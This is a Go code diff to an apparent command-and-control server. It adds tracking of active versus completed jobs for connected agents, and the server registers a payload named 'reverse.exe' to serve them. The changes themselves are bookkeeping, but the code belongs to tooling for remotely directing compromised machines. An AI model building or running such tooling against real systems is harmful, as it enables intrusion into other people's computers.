@@ -20,10 +20,11 @@ type C2Server struct {
 	operatorIdentityKey  string
 	operatorPasswordHash string
 	activeAgents         []Agent
-	jobs                 map[string][]string
+	activeJobs           map[string][]string
 	jobsStatuses         map[string]bool
 	jobsResults          map[string]string
 	payloads             map[string]string
+	completedJobs        map[string][]string
 }
 
 type connectAgent struct {
@@ -76,10 +77,11 @@ func NewC2Server(hostOpt, portOpt, password string) (*C2Server, error) {
 		return nil, err
 	}
 	c2s.r = r
-	c2s.jobs = make(map[string][]string)
+	c2s.activeJobs = make(map[string][]string)
 	c2s.payloads = make(map[string]string)
 	c2s.jobsStatuses = make(map[string]bool)
 	c2s.jobsResults = make(map[string]string)
+	c2s.completedJobs = make(map[string][]string)
 	c2s.payloads["cccccccccccccccc"] = "reverse.exe"
 	return &c2s, nil
 }
@@ -208,7 +210,7 @@ func (c2s *C2Server) initAgentJWTMiddleware() (*jwt.GinJWTMiddleware, error) {
 
 func (c2s *C2Server) jobsHandler(c *gin.Context) {
 	agent, _ := c.Get(c2s.agentIdentityKey)
-	c.JSON(200, c2s.jobs[agent.(*Agent).Uuid])
+	c.JSON(200, c2s.activeJobs[agent.(*Agent).Uuid])
 }
 
 func (c2s *C2Server) payloadHandler(c *gin.Context) {
@@ -241,6 +243,22 @@ func (c2s *C2Server) updateJobStatusHandler(c *gin.Context) {
 			c2s.jobsStatuses[updateJobStatusRequest.JobUuid] = updateJobStatusRequest.Status
 			c2s.jobsResults[updateJobStatusRequest.JobUuid] = updateJobStatusRequest.JobResult
 			c.JSON(200, gin.H{"status": "ok"})
+			if updateJobStatusRequest.Status {
+				jobToMakeCompletedInd := 0
+				for jobInd, jobUuid := range c2s.activeJobs[receivedAgent.(*Agent).Uuid] {
+					if updateJobStatusRequest.JobUuid == jobUuid {
+						jobToMakeCompletedInd = jobInd
+						break
+					}
+				}
+				newJobsPool := append(c2s.activeJobs[receivedAgent.(*Agent).Uuid][:jobToMakeCompletedInd], c2s.activeJobs[receivedAgent.(*Agent).Uuid][jobToMakeCompletedInd+1:]...)
+				c2s.activeJobs[receivedAgent.(*Agent).Uuid] = newJobsPool
+				if len(c2s.completedJobs[receivedAgent.(*Agent).Uuid]) == 0 {
+					c2s.completedJobs[receivedAgent.(*Agent).Uuid] = []string{updateJobStatusRequest.JobUuid}
+				} else {
+					c2s.completedJobs[receivedAgent.(*Agent).Uuid] = append(c2s.completedJobs[receivedAgent.(*Agent).Uuid], updateJobStatusRequest.JobUuid)
+				}
+			}
 		}
 	} else {
 		c.JSON(404, gin.H{"status": "agent not found"})
@@ -327,10 +345,10 @@ func (c2s *C2Server) addJobHandler(c *gin.Context) {
 			}
 		}
 		if agentFound {
-			if len(c2s.jobs[addJobRequest.AgentUuid]) == 0 {
-				c2s.jobs[addJobRequest.AgentUuid] = []string{addJobRequest.JobUuid}
+			if len(c2s.activeJobs[addJobRequest.AgentUuid]) == 0 {
+				c2s.activeJobs[addJobRequest.AgentUuid] = []string{addJobRequest.JobUuid}
 			} else {
-				c2s.jobs[addJobRequest.AgentUuid] = append(c2s.jobs[addJobRequest.AgentUuid], addJobRequest.JobUuid)
+				c2s.activeJobs[addJobRequest.AgentUuid] = append(c2s.activeJobs[addJobRequest.AgentUuid], addJobRequest.JobUuid)
 			}
 			c2s.jobsStatuses[addJobRequest.JobUuid] = false
 			c2s.jobsResults[addJobRequest.JobUuid] = ""
@@ -358,7 +376,13 @@ func (c2s *C2Server) getAllAgentJobsHandler(c *gin.Context) {
 				Result string `json:"job-result"`
 			} `json:"agent-jobs"`
 		}
-		for _, jobUuid := range c2s.jobs[agentUuid] {
+		for _, jobUuid := range c2s.activeJobs[agentUuid] {
+			agentJobsStatus.AgentUuid = agentUuid
+			agentJobsStatus.AgentJobs.Job = jobUuid
+			agentJobsStatus.AgentJobs.Status = c2s.jobsStatuses[jobUuid]
+			agentJobsStatus.AgentJobs.Result = c2s.jobsResults[jobUuid]
+		}
+		for _, jobUuid := range c2s.completedJobs[agentUuid] {
 			agentJobsStatus.AgentUuid = agentUuid
 			agentJobsStatus.AgentJobs.Job = jobUuid
 			agentJobsStatus.AgentJobs.Status = c2s.jobsStatuses[jobUuid]
@@ -381,7 +405,12 @@ func (c2s *C2Server) getJobStatusHandler(c *gin.Context) {
 	}
 	if agentFound {
 		jobFound := false
-		for _, job := range c2s.jobs[agentUuid] {
+		for _, job := range c2s.activeJobs[agentUuid] {
+			if jobUuid == job {
+				jobFound = true
+			}
+		}
+		for _, job := range c2s.completedJobs[agentUuid] {
 			if jobUuid == job {
 				jobFound = true
 			}
